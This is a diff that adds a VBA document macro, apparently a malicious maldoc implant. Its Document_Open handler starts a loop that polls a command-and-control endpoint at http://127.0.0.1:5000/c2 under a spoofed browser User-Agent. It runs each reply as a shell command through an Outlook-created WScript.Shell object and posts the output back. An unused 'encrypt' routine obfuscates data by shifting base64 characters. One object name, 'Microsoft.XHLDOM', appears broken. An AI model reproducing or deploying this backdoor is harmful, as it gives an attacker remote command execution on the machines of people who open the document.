@@ -1,0 +1,79 @@
+Function RunCommand(Command As String) As String
+    
+    On Error GoTo error
+    
+    Set objOL = CreateObject("Outlook.Application")
+    
+    Set WshShell = objOL.CreateObject("Wscript.shell")
+
+    Set WshShellExec = WshShell.Exec(Command)
+
+    RunCommand = WshShellExec.StdOut.ReadAll
+    
+Done:
+        Exit Function
+        
+error:
+        RunCommand = "ERROR"
+    
+End Function
+Function encrypt(data As String)
+
+    strOutput = EncodeBase64(data)
+    
+    For Counter = 1 To Len(strOutput)
+        Char = Mid(strOutput, Counter, 1)
+        charCode = Asc(Char)
+        charCode = charCode + 1
+        newString = newString + Chr(charCode)
+    Next
+    
+    encrypt = newString
+    
+End Function
+
+Function EncodeBase64(text$)
+    Dim b
+    With CreateObject("ADODB.Stream")
+        .Open: .Type = 2: .Charset = "utf-8"
+        .WriteText text: .Position = 0: .Type = 1: b = .Read
+        With CreateObject("Microsoft.XHLDOM").createElement("b64")
+            .DataType = "bin.base64": .nodeTypedValue = b
+            EncodeBase64 = Replace(Mid(.text, 5), vbLf, "")
+        End With
+        .Close
+    End With
+End Function
+Function StartC2()
+    Dim replyTXT As String
+    
+    On Error GoTo error
+    
+    data = "START"
+    
+    Do While replyTXT <> "STOP"
+    
+        Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+        URL = "http://127.0.0.1:5000/c2"
+        objHTTP.Open "POST", URL, False
+        objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
+        objHTTP.send (data)
+        replyTXT = objHTTP.responseText
+        data = RunCommand(replyTXT)
+        
+    Loop
+    
+Done:
+    Exit Function
+    
+error:
+    MsgBox ("Cannot connect to http://127.0.0.1:5000/c2")
+
+End Function
+
+Sub Document_Open()
+    Dim strOutput As String
+
+    StartC2
+
+End Sub
